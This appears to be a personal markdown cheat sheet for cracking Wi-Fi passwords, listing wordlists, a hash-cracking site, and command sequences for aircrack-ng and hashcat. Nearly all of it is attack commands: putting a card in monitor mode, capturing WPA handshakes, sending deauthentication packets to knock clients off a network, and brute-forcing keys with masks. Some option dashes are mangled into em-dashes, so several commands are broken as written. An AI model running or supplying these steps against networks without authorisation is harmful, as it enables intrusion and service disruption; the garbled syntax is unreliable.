# WIFI password pentesting

### wordlists
* [kaonashi-passwords](https://github.com/kaonashi-passwords/Kaonashi)
* [profanity-words](https://github.com/RobertJGabriel/Google-profanity-words)

### links
* [Online hashcrack](http://www.onlinehashcrack.com/89edec5249)
* [Default router keys](https://forum.hashkiller.co.uk/topic-view.aspx?t=2715)

### kali
```bash
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng —bssid 00:11:22:33:44:55 —channel 1 —write dump wlan0mon
aireplay-ng —deauth 10 -a 00:11:22:33:44:55 [-c 66:77:88:99:AA:BB] wlan0mon
wpaclean cleandump.cap dump.cap
aircrack-ng -J clean.hccap cleandump.cap
cudahashcat xxxxxxx
```

### hashcat
```bash
hashcat -m 2500 girasole.hccap ./rockme.txt
hashcat -m 2500 -a 3 girasole.hccap hima?l?l?l?l
hashcat -m 2500 -a3 virginmedia7.hccap —pw-min=8 -1 abcdefghjklmnpqrstuvwxyz a?1?1?1?1?1?1?1
hashcat -m 2500 -a3 virginmedia7.hccap —pw-min=8 -1 abcdefghjklmnpqrstuvwxyz b?1?1?1?1?1?1?1
hashcat -m 2500 -a3 virginmedia7.hccap —pw-min=8 -1 abcdefghjklmnpqrstuvwxyz c?1?1?1?1?1?1?1
```

### old videos
* [WEP](https://youtu.be/RydsjNhUjdg)
* [WPA](https://youtu.be/kpI3fQjf43E)
* [WPS](https://youtu.be/knllpZF508k)
